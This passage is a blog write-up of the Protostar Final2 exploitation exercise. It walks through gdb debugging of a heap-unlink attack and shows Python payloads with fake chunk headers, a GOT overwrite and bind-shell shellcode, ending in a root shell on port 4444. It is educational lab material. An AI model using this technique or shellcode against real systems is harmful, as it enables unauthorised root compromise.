+0x0804bd7a &lt;get_requests+51&gt;:	mov    -0x14(%ebp),%edx
+0x0804bd7d &lt;get_requests+54&gt;:	mov    %edx,-0x414(%ebp,%eax,4)
+0x0804bd84 &lt;get_requests+61&gt;:	addl   $0x1,-0x10(%ebp)
+0x0804bd88 &lt;get_requests+65&gt;:	movl   $0x80,0x8(%esp)
+0x0804bd90 &lt;get_requests+73&gt;:	mov    -0x14(%ebp),%eax
+0x0804bd93 &lt;get_requests+76&gt;:	mov    %eax,0x4(%esp)
+0x0804bd97 &lt;get_requests+80&gt;:	mov    0x8(%ebp),%eax
+0x0804bd9a &lt;get_requests+83&gt;:	mov    %eax,(%esp)
+0x0804bd9d &lt;get_requests+86&gt;:	call   0x8048e5c &lt;read@plt&gt;
+0x0804bda2 &lt;get_requests+91&gt;:	cmp    $0x80,%eax
+0x0804bda7 &lt;get_requests+96&gt;:	jne    0x804bdde &lt;get_requests+151&gt;
+0x0804bda9 &lt;get_requests+98&gt;:	movl   $0x4,0x8(%esp)
+0x0804bdb1 &lt;get_requests+106&gt;:	movl   $0x804c2d1,0x4(%esp)
+0x0804bdb9 &lt;get_requests+114&gt;:	mov    -0x14(%ebp),%eax
+0x0804bdbc &lt;get_requests+117&gt;:	mov    %eax,(%esp)
+0x0804bdbf &lt;get_requests+120&gt;:	call   0x8048fdc &lt;strncmp@plt&gt;
+0x0804bdc4 &lt;get_requests+125&gt;:	test   %eax,%eax
+0x0804bdc6 &lt;get_requests+127&gt;:	jne    0x804bde1 &lt;get_requests+154&gt;
+0x0804bdc8 &lt;get_requests+129&gt;:	mov    -0x14(%ebp),%eax
+0x0804bdcb &lt;get_requests+132&gt;:	add    $0x4,%eax
+0x0804bdce &lt;get_requests+135&gt;:	mov    %eax,(%esp)
+0x0804bdd1 &lt;get_requests+138&gt;:	call   0x804bcd0 &lt;check_path&gt;
+0x0804bdd6 &lt;get_requests+143&gt;:	jmp    0x804bd57 &lt;get_requests+16&gt;
+0x0804bddb &lt;get_requests+148&gt;:	nop
+0x0804bddc &lt;get_requests+149&gt;:	jmp    0x804bde2 &lt;get_requests+155&gt;
+0x0804bdde &lt;get_requests+151&gt;:	nop
+0x0804bddf &lt;get_requests+152&gt;:	jmp    0x804bde2 &lt;get_requests+155&gt;
+0x0804bde1 &lt;get_requests+154&gt;:	nop
+0x0804bde2 &lt;get_requests+155&gt;:	movl   $0x0,-0xc(%ebp)
+0x0804bde9 &lt;get_requests+162&gt;:	jmp    0x804be1c &lt;get_requests+213&gt;
+0x0804bdeb &lt;get_requests+164&gt;:	movl   $0xb,0x8(%esp)
+0x0804bdf3 &lt;get_requests+172&gt;:	movl   $0x804c2d6,0x4(%esp)
+0x0804bdfb &lt;get_requests+180&gt;:	mov    0x8(%ebp),%eax
+0x0804bdfe &lt;get_requests+183&gt;:	mov    %eax,(%esp)
+0x0804be01 &lt;get_requests+186&gt;:	call   0x8048dfc &lt;write@plt&gt;
+0x0804be06 &lt;get_requests+191&gt;:	mov    -0xc(%ebp),%eax
+0x0804be09 &lt;get_requests+194&gt;:	mov    -0x414(%ebp,%eax,4),%eax
+0x0804be10 &lt;get_requests+201&gt;:	mov    %eax,(%esp)
+0x0804be13 &lt;get_requests+204&gt;:	call   0x804a9c2 &lt;free&gt;
+0x0804be18 &lt;get_requests+209&gt;:	addl   $0x1,-0xc(%ebp)
+0x0804be1c &lt;get_requests+213&gt;:	mov    -0xc(%ebp),%eax
+0x0804be1f &lt;get_requests+216&gt;:	cmp    -0x10(%ebp),%eax
+0x0804be22 &lt;get_requests+219&gt;:	jl     0x804bdeb &lt;get_requests+164&gt;
+0x0804be24 &lt;get_requests+221&gt;:	leave
+0x0804be25 &lt;get_requests+222&gt;:	ret
+End of assembler dump.
+(gdb) b *get_requests+45
+Breakpoint 1 at 0x804bd74: file final2/final2.c, line 43.
+(gdb) b *get_requests+201
+Breakpoint 2 at 0x804be10: file final2/final2.c, line 55.
+</code></pre>
+
+<p>Now, we will tell gdb to follow the process children and continue to wait for the incoming connection:</p>
+
+<pre><code class="language-lang-bash">(gdb) set follow-fork-mode child
+(gdb) c
+Continuing.
+</code></pre>
+
+<p>Now we can send our test payload:</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;FSRD&quot; + &quot;X&quot;*(128-4-1) + &quot;/&quot;)
+s.send(&quot;FSRD&quot; + &quot;ROOT&quot; + &quot;/&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\xff\xff\xff\xff&quot; + &quot;XXXX&quot; + &quot;AAAA&quot; + &quot;DDDD&quot; + &quot;\x90&quot;*(128-len(shellcode)-4-4-1-4-4-4-4-4-1) + shellcode)
+</code></pre>
+
+<p>and in gdb we get our new process:</p>
+
+<pre><code class="language-lang-bash">[New process 1490]
+[Switching to process 1490]
+
+Breakpoint 1, 0x0804bd74 in get_requests (fd=4) at final2/final2.c:43
+43	final2/final2.c: No such file or directory.
+	in final2/final2.c
+Current language:  auto
+The current source language is &quot;auto; currently c&quot;.
+</code></pre>
+
+<p>In our first breakpoint we should be able to get the first chunk address:</p>
+
+<pre><code class="language-lang-bash">(gdb) i r eax
+eax            0x804e008	134537224
+</code></pre>
+
+<p>Lets continue and find out the address of the second chunk:</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+
+Breakpoint 1, 0x0804bd74 in get_requests (fd=4) at final2/final2.c:43
+43	in final2/final2.c
+(gdb) i r eax
+eax            0x804e090	134537360
+</code></pre>
+
+<p>This looks ok: 0x804e090 - 0x804e008 = 0x88 = 136 = 128 + 8 (headers)
+So now we know that the second chunk will be allocated in 0x804e090 and our shellcode should be 29 bytes ahead. Since we have a nop sled, lets say 36 -&gt; 0x804e090 + 36 = 0x804eb4</p>
+
+<p>When we hit the second breakpoint (just before the first call to free()):</p>
+
+<pre><code class="language-lang-bash">Breakpoint 2, 0x0804be10 in get_requests (fd=4) at final2/final2.c:55
+55	in final2/final2.c
+(gdb) i r eax
+eax            0x804e008	134537224
+</code></pre>
+
+<p>We can check that we were right and that the chunks being freed were the ones we previouly allocated.</p>
+
+<p>Lets see how does the chunk1 memory looks like before the free():</p>
+
+<pre><code class="language-lang-bash">(gdb) x/32x 0x804e008
+0x804e008:	0x44525346	0x58585858	0x58585858	0x58585858
+0x804e018:	0x58585858	0x58585858	0x58585858	0x58585858
+0x804e028:	0x58585858	0x58585858	0x58585858	0x58585858
+0x804e038:	0x58585858	0x58585858	0x58585858	0x58585858
+0x804e048:	0x58585858	0x58585858	0x58585858	0x58585858
+0x804e058:	0x58585858	0x58585858	0x58585858	0x58585858
+0x804e068:	0x58585858	0x58585858	0x58585858	0x58585858
+0x804e078:	0x58585858	0x58585858	0x58585858	0x2f585858
+</code></pre>
+
+<p>This looks pretty sane, our &ldquo;FSRD&rdquo; string followed by 123 &ldquo;X&rdquo;s and then a &ldquo;/&rdquo; (0x2f)</p>
+
+<p>And the chunk2:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/32x 0x804e008+136
+0x804e090:	0x44525346	0x544f4f52	0xfffffc2f	0xffffffff
+0x804e0a0:	0x585858ff	0x41414158	0x44444441	0x90909044
+0x804e0b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804e0c0:	0xf7db3190	0x534353e3	0xe189026a	0x80cd66b0
+0x804e0d0:	0x68525e5b	0x5c1102ff	0x5051106a	0x666ae189
+0x804e0e0:	0x8980cd58	0x04b30441	0x80cd66b0	0xcd66b043
+0x804e0f0:	0x6a599380	0x80cd583f	0x68f87949	0x68732f2f
+0x804e100:	0x69622f68	0x50e3896e	0xb0e18953	0x0080cd0b
+</code></pre>
+
+<p>Again we have our &ldquo;FSRD&rdquo; string followed by the &ldquo;ROOT&rdquo; one, the &ldquo;/&rdquo;, the &ldquo;-4&rdquo;, &ldquo;-1&rdquo;, 4*&ldquo;X&rdquo;, 4&rdquo;A&rdquo;s, 4&rdquo;D&rdquo;s, the NOP sled and our shellcode</p>
+
+<p>Now lets take a look at the chunk 2 headers:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/2x 0x804e090-8
+0x804e088:	0x00000000	0x00000089
+</code></pre>
+
+<p>Damn it, our memmove call has not worked correctly, since we were expecting our &ldquo;-4&rdquo; and &ldquo;-1&rdquo; here.</p>
+
+<p>If we start the debugging again and add a breakpoint to analyze &ldquo;check_path&rdquo;, we find out that its only being called once for chunk1, not for chunk2. There was a error in our payload so that the second chunk was only 127 bytes and so we broke the loop. Once fixed:</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;FSRD&quot; + &quot;X&quot;*(128-4-1) + &quot;/&quot;)
+s.send(&quot;FSRD&quot; + &quot;ROOT&quot; + &quot;/&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\xff\xff\xff\xff&quot; + &quot;XXXX&quot; + &quot;AAAA&quot; + &quot;DDDD&quot; + &quot;\x90&quot;*(128-len(shellcode)-4-4-1-4-4-4-4-4) + shellcode)
+</code></pre>
+
+<p>We hit the second call to &ldquo;check_path&rdquo;. The chunk2 headers before the &ldquo;memmove&rdquo;:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/2x 0x804e090-8
+0x804e088:	0x00000000	0x00000089
+</code></pre>
+
+<p>and after the &ldquo;memmove&rdquo;</p>
+
+<pre><code class="language-lang-bash">(gdb) x/2x 0x804e090-8
+0x804e088:	0x896e6962	0x895350e3
+</code></pre>
+
+<p>Damn it!!! something went wrong. Lets check chunk2 memory:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/32x 0x804e008+136
+0x804e090:	0xcd0bb0e1	0x544f4f80	0xfffffc2f	0xffffffff
+0x804e0a0:	0x585858ff	0x41414158	0x44444441	0x90909044
+0x804e0b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804e0c0:	0xdb319090	0x4353e3f7	0x89026a53	0xcd66b0e1
+0x804e0d0:	0x525e5b80	0x1102ff68	0x51106a5c	0x6ae18950
+0x804e0e0:	0x80cd5866	0xb3044189	0xcd66b004	0x66b04380
+0x804e0f0:	0x599380cd	0xcd583f6a	0xf8794980	0x732f2f68
+0x804e100:	0x622f6868	0xe3896e69	0xe1895350	0x80cd0bb0
+</code></pre>
+
+<p>So the first 8 bytes also looks wrong. It seems like we have copy to the right position, but the wrong content and length.</p>
+
+<p>The problem is that our shellcode contains &ldquo;/&ldquo;s so we wont be copying the right content. Lets put the shellcode before the last &ldquo;/&rdquo; and the fake fd and bk pointers:</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;FSRD&quot; + &quot;X&quot;*(128-4-1) + &quot;/&quot;)
+s.send(&quot;FSRD&quot; + &quot;ROOT&quot; + &quot;\x90&quot;*(128-len(shellcode)-4-4-1-4-4-4-4) + shellcode + &quot;/&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\x10\xd4\x04\x08&quot; + &quot;DDDD&quot;)
+</code></pre>
+
+<p>Now lets check again if the &ldquo;memmove&rdquo; worked as expected:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/2x 0x804e090-8
+0x804e088:	0xfffffffc	0xffffffff
+</code></pre>
+
+<p>And our chunk2 memory space:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/32x 0x804e090
+0x804e090:	0x0804d410	0x44444444	0x90909090	0x90909090
+0x804e0a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804e0b0:	0xf7db3190	0x534353e3	0xe189026a	0x80cd66b0
+0x804e0c0:	0x68525e5b	0x5c1102ff	0x5051106a	0x666ae189
+0x804e0d0:	0x8980cd58	0x04b30441	0x80cd66b0	0xcd66b043
+0x804e0e0:	0x6a599380	0x80cd583f	0x68f87949	0x68732f2f
+0x804e0f0:	0x69622f68	0x50e3896e	0xb0e18953	0x2f80cd0b
+0x804e100:	0xfffffffc	0xfffffffc	0x0804d410	0x44444444
+</code></pre>
+
+<p>This looks ok, however we are getting a SIGSEGV when freeing the first chunk:</p>
+
+<pre><code class="language-lang-bash">Program received signal SIGSEGV, Segmentation fault.
+0x0804aaf8 in free (mem=0x804e008) at final2/../common/malloc.c:3648
+3648	final2/../common/malloc.c: No such file or directory.
+	in final2/../common/malloc.c
+</code></pre>
+
+<p>Lets see what is happening:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/i 0x0804aaf8
+0x804aaf8 &lt;free+310&gt;:	mov    %edx,0x8(%eax)
+(gdb) i r eax
+eax            0x44444444	1145324612
+(gdb) i r edx
+edx            0x804d410	134534160
+</code></pre>
+
+<p>Oh nice, so its just us trying to overwrite the GOT entry with our DDDD block. So lets use the address of our shellcode instead. AS we saw in the chunk2 memory, our shellcode starts in 0x804e098:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/32x 0x804e090
+0x804e090:	0x0804d410	0x44444444	0x90909090	0x90909090
+0x804e0a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0x804e0b0:	0xf7db3190	0x534353e3	0xe189026a	0x80cd66b0
+0x804e0c0:	0x68525e5b	0x5c1102ff	0x5051106a	0x666ae189
+0x804e0d0:	0x8980cd58	0x04b30441	0x80cd66b0	0xcd66b043
+0x804e0e0:	0x6a599380	0x80cd583f	0x68f87949	0x68732f2f
+0x804e0f0:	0x69622f68	0x50e3896e	0xb0e18953	0x2f80cd0b
+0x804e100:	0xfffffffc	0xfffffffc	0x0804d410	0x44444444
+</code></pre>
+
+<p>So our final payload will be:</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;FSRD&quot; + &quot;X&quot;*(128-4-1) + &quot;/&quot;)
+s.send(&quot;FSRD&quot; + &quot;ROOT&quot; + &quot;\x90&quot;*(128-len(shellcode)-4-4-1-4-4-4-4) + shellcode + &quot;/&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot; + &quot;\x10\xd4\x04\x08&quot; + &quot;\x98\xe0\x04\x08&quot; )
+</code></pre>
+
+<p>Lets try it:</p>
+
+<pre><code class="language-lang-bash"></code></pre>
+
+<p>and the shell should be waiting for us in port 4444:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# netstat -natp | grep LISTEN
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      777/portmap
+tcp        0      0 0.0.0.0:2993            0.0.0.0:*               LISTEN      1301/final2
+tcp        0      0 0.0.0.0:2994            0.0.0.0:*               LISTEN      1299/final1
+tcp        0      0 0.0.0.0:2995            0.0.0.0:*               LISTEN      1297/final0
+tcp        0      0 0.0.0.0:2996            0.0.0.0:*               LISTEN      1295/net3
+tcp        0      0 0.0.0.0:2997            0.0.0.0:*               LISTEN      1293/net2
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1361/sshd
+tcp        0      0 0.0.0.0:2998            0.0.0.0:*               LISTEN      1291/net1
+tcp        0      0 0.0.0.0:2999            0.0.0.0:*               LISTEN      1289/net0
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1270/exim4
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1819/final2
+tcp        0      0 0.0.0.0:46752           0.0.0.0:*               LISTEN      789/rpc.statd
+tcp6       0      0 :::22                   :::*                    LISTEN      1361/sshd
+tcp6       0      0 ::1:25                  :::*                    LISTEN      1270/exim4
+root@protostar:~# nc localhost 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Voila!!</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/protostar"><span class="tag">Protostar</span></a></li>
+        
+          <li><a href="/tags/final0"><span class="tag">Final0</span></a></li>
+        
+          <li><a href="/tags/final1"><span class="tag">Final1</span></a></li>
+        
+          <li><a href="/tags/final2"><span class="tag">Final2</span></a></li>
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/exploiting"><span class="tag">Exploiting</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2128</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
